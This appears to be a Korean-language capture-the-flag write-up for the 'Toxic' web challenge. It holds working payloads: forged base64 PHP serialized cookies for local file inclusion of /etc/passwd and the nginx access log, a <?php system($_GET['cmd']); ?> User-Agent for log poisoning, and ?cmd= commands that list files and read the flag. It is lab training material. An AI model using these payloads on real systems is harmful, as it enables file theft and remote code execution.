@@ -1,0 +1,57 @@
+Challenge: Toxic
+TARGET: 94.237.57.115:39582
+
+
+
+index.php 코드를 보면
+
+페이지모델 객체를 base64로 인코딩해서 쿠키로 사용중임
+burpsuite으로 현재 세션을 확인
+Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxNToiL3d3dy9pbmRleC5odG1sIjt9
+base64디코딩
+O:9:"PageModel":1:{s:4:"file";s:15:"/www/index.html";}
+객체의 형태를 어느정도 파악
+
+
+O:9:"PageModel":1:{s:4:"file";s:4:"/var/flag";}
+base64인코딩
+Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czo0OiJmbGFnIjt9
+
+플래그 객체로 수정후 인코딩 
+쿠키를 수정해서 요청을 보내봤으나 실패
+
+
+O:9:"PageModel":1:{s:4:"file";s:11:"/etc/passwd";}
+base64인코딩
+Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxMToiL2V0Yy9wYXNzd2QiO30=
+
+/etc/passwd는 정상적으로 lfi 성공 접근 권한이 없어서 실패한거같음
+로그 포이즈닝으로 리버스셸 연결 시도
+
+nginx의 access.log의 위치는 /var/log/nginx/access.log
+
+O:9:"PageModel":1:{s:4:"file";s:25:"/var/log/nginx/access.log";}
+base64인코딩
+Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoyNToiL3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZyI7fQ==
+요청결과 로그가 잘 출력됨
+
+헤더를 인위적으로 수정해서 로그 포이즈닝 시도
+User-Agent: <?php system($_GET['cmd']); ?> 유저에이전트를 php rce 수정
+
+
+다시 access.log 세션으로 
+GET /?cmd=ls HTTP/1.1 요청을 보내면 
+index.html
+index.php
+models
+static
+명령어가 실행된걸 확인할 수 있다
+
+GET /?cmd=ls ./../ HTTP/1.1
+flag_B6HLk
+플래그를 찾았다
+GET /?cmd=cat ./../flag_B6HLk HTTP/1.1
+HTB{P0i5on_1n_Cyb3r_W4rF4R3?!}
+플래그 획득
+
+
